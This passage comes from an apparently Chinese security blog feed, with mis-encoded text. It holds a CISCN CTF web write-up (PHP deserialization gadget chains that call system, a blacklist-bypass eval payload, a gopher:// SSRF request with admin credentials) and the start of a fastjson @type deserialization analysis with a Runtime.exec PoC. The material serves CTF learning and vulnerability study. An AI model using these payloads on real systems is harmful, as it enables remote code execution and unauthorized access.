    <content type="html"><![CDATA[<h1 id="CISCNåå—èµ›åŒºåˆ†åŒºèµ›wp"><a href="#CISCNåå—èµ›åŒºåˆ†åŒºèµ›wp" class="headerlink" title="CISCNåå—èµ›åŒºåˆ†åŒºèµ›wp"></a>CISCNåå—èµ›åŒºåˆ†åŒºèµ›wp</h1><p>æœŸæœ«è€ƒç»ˆäºç»“æŸäº†ï¼ŒæŠ“ç´§æ¥æ•´ç†ä¸€ä¸‹è¿™æ¬¡æ¯”èµ›çš„wp</p><h1 id="easy-seri"><a href="#easy-seri" class="headerlink" title="easy_seri"></a>easy_seri</h1><p>ç¬¬ä¸€æ­¥å…ˆé™æ€è°ƒè¯•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$public_key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$private_key</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$public_key</span> !== <span class="variable">$private_key</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You can&#x27;t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getHint</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;./demo.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="variable">$a</span>,<span class="string">&#x27;key&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;No!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    unserialize(<span class="variable">$a</span>)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a=s:<span class="number">13</span>:<span class="string">&quot;Test::getHint&quot;</span>; gethint</span><br></pre></td></tr></table></figure><p>çœ‹å…¶ä»–å¸ˆå‚…çš„wpä¹Ÿå¯ä»¥16è¿›åˆ¶ç»•strposï¼Œç„¶åç»•wakeupï¼Œæ•°ç»„æ‰§è¡ŒgetHintï¼ˆå› ä¸ºunserializeåé¢è¿˜æœ‰ä¸ªæ‹¬å·ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$test</span>-&gt;public_key = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$test</span>-&gt;private_key = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span> = [<span class="variable">$test</span>, <span class="string">&#x27;getHint&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥çœ‹åˆ°demo.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fake</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$firm</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$firm</span>,<span class="variable">$test</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;No,You can&#x27;t&quot;</span>;</span><br><span class="line"><span class="variable">$firm</span> = unserialize(<span class="variable">$firm</span>);</span><br><span class="line">call_user_func(<span class="variable">$firm</span>,<span class="variable">$test</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Temp</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$pri</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$fin</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">$this</span>-&gt;action;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;pri-&gt;<span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;fin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OwO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$args</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;fc)(<span class="keyword">$this</span>-&gt;args);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;poc&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$d</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fake</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$firm</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$firm</span>, <span class="variable">$test</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$test</span> = <span class="string">&quot;No,You can&#x27;t&quot;</span>;</span><br><span class="line">        <span class="variable">$firm</span> = unserialize(<span class="variable">$firm</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$firm</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line">        call_user_func(<span class="variable">$firm</span>, <span class="variable">$test</span>); <span class="comment">//OwO run</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Temp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pri</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fin</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;action;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pri-&gt;<span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;fin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OwO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fc</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$args</span> = <span class="string">&quot;id&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;fc)(<span class="keyword">$this</span>-&gt;args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$a=array(new OwO,&#x27;run&#x27;);</span></span><br><span class="line"><span class="comment">//echo serialize($a);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Temp;</span><br><span class="line"><span class="variable">$a</span>-&gt;pri=<span class="keyword">new</span> Fake;</span><br><span class="line"><span class="variable">$a</span>-&gt;action=<span class="string">&#x27;a:2:&#123;i:0;O:3:&quot;OwO&quot;:2:&#123;s:2:&quot;fc&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;s:2:&quot;ls&quot;;&#125;i:1;s:3:&quot;run&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="magicchar"><a href="#magicchar" class="headerlink" title="magicchar"></a>magicchar</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span><span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Magic</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;=strlen(<span class="variable">$str</span>)<span class="number">-1</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((ord(<span class="variable">$str</span>[<span class="variable">$i</span>])&lt;<span class="number">32</span>) <span class="keyword">or</span> (ord(<span class="variable">$str</span>[<span class="variable">$i</span>])&gt;<span class="number">126</span>)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;sorry&#x27;</span>);</span><br><span class="line">      <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$blklst</span> = [<span class="string">&#x27;[A-VX-Za-z]&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&quot;&quot;&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;~&#x27;</span>];</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$blklst</span> <span class="keyword">as</span> <span class="variable">$blkitem</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blkitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;out&#x27;</span>);</span><br><span class="line">      <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yell&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yell&#x27;</span>];</span><br><span class="line">  Magic(<span class="variable">$str</span>);</span><br><span class="line">  ob_start();</span><br><span class="line">  <span class="variable">$res</span> = <span class="keyword">eval</span>(<span class="string">&quot;echo &quot;</span> . <span class="variable">$str</span> . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">  <span class="variable">$out</span> = ob_get_contents();</span><br><span class="line">  ob_end_clean();</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$out</span> === <span class="string">&quot;Wa4nn&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> htmlspecialchars(<span class="variable">$out</span>, ENT_QUOTES);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¥—è·¯é¢˜</p><p>å­—ç¬¦ä¸²æˆ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yell=%<span class="number">22</span>W%<span class="number">22.</span>(%<span class="number">22</span>@%<span class="number">22</span>|%<span class="number">22</span>!%<span class="number">22</span>).%<span class="number">224</span>%<span class="number">22.</span>(%<span class="number">22</span>@%<span class="number">22</span>|%<span class="number">22.</span>%<span class="number">22</span>).(%<span class="number">22</span>@%<span class="number">22</span>|%<span class="number">22.</span>%<span class="number">22</span>)</span><br></pre></td></tr></table></figure><h1 id="really-admin"><a href="#really-admin" class="headerlink" title="really_admin"></a><strong>really_admin</strong></h1><p>ç¬¬ä¸€æ­¥æ ¹æ®æç¤ºç›´æ¥md5è¿‡</p><p>admin/129581926211651571912466741651878684928</p><p>è¿›æ¥ä¹‹åæ ¹æ®æç¤ºå»ssrf.php</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled.png" alt=""></p><p>çœ‹åˆ°è¿™ä¸ªç†Ÿæ‚‰çš„ç•Œé¢åŠ ä¸Šä¸Šé¢çš„æ…¢æ…¢åšç®¡ç†ç³»ç»Ÿçš„æ ‡é¢˜</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%201.png" alt="CISCN%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9Bwp%20f1f334862d914c13a0934a194b3ea0be/Untitled%201.png"></p><p>ç ´æ¡ˆäº†hfctfåŸé¢˜</p><p>ç›´æ¥ç¿»å‡ºä¹‹å‰æ‰“hfctfçš„wpï¼Œç›´æ¥æ‰“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.35.16.17&#x2F;ssrf.php?way&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_%250APOST%2520&#x2F;admin.php%2520HTTP&#x2F;1.1%250AHost%253A%2520127.0.0.1%250AContent-Type%253A%2520application&#x2F;x-www-form-urlencoded%250AContent-Length%253A%252056%250A%250Ausername%253Dadmin%2526password%253D5fb4e07de914cfc82afb44vbaf402203%250A</span><br></pre></td></tr></table></figure><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%202.png" alt="CISCN%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9Bwp%20f1f334862d914c13a0934a194b3ea0be/Untitled%202.png"></p><p>æŠŠcookieä¿å­˜ä¸‹æ¥ï¼Œç„¶åæ”¹ä¹‹åè®¿é—®flag.php</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%203.png" alt="CISCN%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9Bwp%20f1f334862d914c13a0934a194b3ea0be/Untitled%203.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CISCNåå—èµ›åŒºåˆ†åŒºèµ›wp&quot;&gt;&lt;a href=&quot;#CISCNåå—èµ›åŒºåˆ†åŒºèµ›wp&quot; class=&quot;headerlink&quot; title=&quot;CISCNåå—èµ›åŒºåˆ†åŒºèµ›wp&quot;&gt;&lt;/a&gt;CISCNåå—èµ›åŒºåˆ†åŒºèµ›wp&lt;/h1&gt;&lt;p&gt;æœŸæœ«è€ƒç»ˆäºç»“æŸäº†ï¼ŒæŠ“ç´§æ¥æ•´ç†ä¸€ä¸‹è¿™æ¬¡æ¯”èµ›çš„w</summary>
      
    
    
    
    <category term="ctf" scheme="http://www.fxizenta.design/categories/ctf/"/>
    
    <category term="web" scheme="http://www.fxizenta.design/categories/ctf/web/"/>
    
    
    <category term="wp" scheme="http://www.fxizenta.design/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>fastjsonååºåˆ—åŒ–æ¼æ´åˆ†æä¸å¤ç°</title>
    <link href="http://www.fxizenta.design/2021/05/29/fastjson/"/>
    <id>http://www.fxizenta.design/2021/05/29/fastjson/</id>
    <published>2021-05-29T13:21:06.000Z</published>
    <updated>2021-08-13T15:35:56.977Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fastjsonååºåˆ—åŒ–æ¼æ´"><a href="#fastjsonååºåˆ—åŒ–æ¼æ´" class="headerlink" title="fastjsonååºåˆ—åŒ–æ¼æ´"></a>fastjsonååºåˆ—åŒ–æ¼æ´</h1><h1 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h1><p>FastJsonæ˜¯å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°Java Beanã€‚Fastjsonåº”ç”¨èŒƒå›´éå¸¸å¹¿ï¼Œåœ¨githubä¸Šstaræ•°è¶…è¿‡22kã€‚2017å¹´3æœˆ15æ—¥ï¼Œfastjsonå®˜æ–¹ä¸»åŠ¨çˆ†å‡ºfastjsonåœ¨1.2.24åŠä¹‹å‰ç‰ˆæœ¬å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œé«˜å±å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ­¤æ¼æ´è¿œç¨‹æ‰§è¡Œæ¶æ„ä»£ç æ¥å…¥ä¾µæœåŠ¡å™¨ã€‚2020å¹´6æœˆ1æ—¥ fastjsonçˆ†å‘æ–°çš„ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œfastjson 1.2.68åŠä»¥å‰ç‰ˆæœ¬å­˜åœ¨é»‘å®¢åˆ©ç”¨æ¼æ´ï¼Œå¯ç»•è¿‡autoTypeé™åˆ¶ï¼Œç›´æ¥è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤æ”»å‡»æœåŠ¡å™¨ï¼Œé£é™©æå¤§ã€‚æœ¬æ–‡ç®€è¦ä»‹ç»Fastjsonååºåˆ—åŒ–æ¼æ´åˆ©ç”¨åŸç†å¹¶å¤ç°è¢«åˆ©ç”¨è¿‡ç¨‹ï¼Œä»¥ä½¿å¾—æŠ€æœ¯äººå‘˜åœ¨å·¥ä½œä¸­å¯¹Fastjsonååºåˆ—åŒ–æ¼æ´æœ‰æ›´è¿›ä¸€æ­¥çš„è®¤è¯†ï¼Œæé«˜é‡è§†ç¨‹åº¦ã€‚</p><h1 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h1><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>Fastjsonååºåˆ—åŒ–æ¼æ´è¢«åˆ©ç”¨çš„åŸå› ï¼Œå¯ä»¥å½’ç»“ä¸ºä¸¤æ–¹é¢ï¼š</p><ul><li>Fastjsonæä¾›äº†ååºåˆ—åŒ–åŠŸèƒ½ï¼Œå…è®¸ç”¨æˆ·åœ¨è¾“å…¥JSONä¸²æ—¶é€šè¿‡â€œ@typeâ€é”®å¯¹åº”çš„valueæŒ‡å®šä»»æ„ååºåˆ—åŒ–ç±»åï¼›</li><li>Fastjsonè‡ªå®šä¹‰çš„ååºåˆ—åŒ–æœºåˆ¶ä¼šä½¿ç”¨åå°„ç”Ÿæˆä¸Šè¿°æŒ‡å®šç±»çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œå¹¶è‡ªåŠ¨è°ƒç”¨è¯¥å¯¹è±¡çš„setteræ–¹æ³•åŠéƒ¨åˆ†getteræ–¹æ³•ã€‚</li></ul><p>å¯¹ç¼–ç¨‹äººå‘˜è€Œè¨€ï¼Œåœ¨ä½¿ç”¨Fastjsonååºåˆ—åŒ–æ—¶ä¼šä½¿ç”¨åˆ°Fastjsonæ‰€æä¾›çš„å‡ ä¸ªé™æ€æ–¹æ³•ï¼š</p><ul><li>parse (String text)</li><li>parseObject(String text)</li><li>parseObject(String text, Class clazz)</li></ul><p>æ— è®ºä½¿ç”¨ä¸Šè¿°å“ªç§æ–¹å¼å¤„ç†JSONå­—ç¬¦ä¸²ï¼Œéƒ½ä¼šæœ‰æœºä¼šè°ƒç”¨ç›®æ ‡ç±»ä¸­ç¬¦åˆè¦æ±‚çš„Getteræ–¹æ³•æˆ–è€…Setteræ–¹æ³•ï¼Œå¦‚æœä¸€ä¸ªç±»ä¸­çš„Getteræˆ–è€…Setteræ–¹æ³•æ»¡è¶³è°ƒç”¨æ¡ä»¶å¹¶ä¸”å­˜åœ¨å¯åˆ©ç”¨ç‚¹ï¼Œé‚£ä¹ˆè¿™ä¸ªæ”»å‡»é“¾å°±äº§ç”Ÿäº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> String cmd;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Poc</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Poc() is called&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getCmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;getCmd() is called&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> cmd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;setCmd() is called&quot;</span>);</span><br><span class="line"><span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">Runtime.getRuntime().exec(cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestPoc</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">String Poc = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;poc.test.Poc\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line">JSONObject b = JSON.parseObject(Poc);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºé¡ºåº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Poc() is called</span><br><span class="line">setCmd() is called</span><br><span class="line">getCmd() is called</span><br></pre></td></tr></table></figure><p>Fastjsonå…è®¸ç”¨æˆ·åœ¨è¾“å…¥JSONä¸²æ—¶é€šè¿‡<strong>â€œ@typeâ€é”®å¯¹åº”çš„valueæŒ‡å®šä»»æ„ååºåˆ—åŒ–ç±»å</strong>ï¼Œä¸ºäº†è®©æœåŠ¡ç«¯æŒ‰ç…§æŒ‡å®šç±»å‹ååºåˆ—åŒ–ï¼Œæ‰€ä»¥è¿™é‡Œå†å¼•å…¥ä¸€ä¸ª@typeã€‚é€šè¿‡typeæŒ‡å®šäº†ååºåˆ—åŒ–çš„ç±»å‹ï¼Œåœ¨ç»™parseObjectä¼ 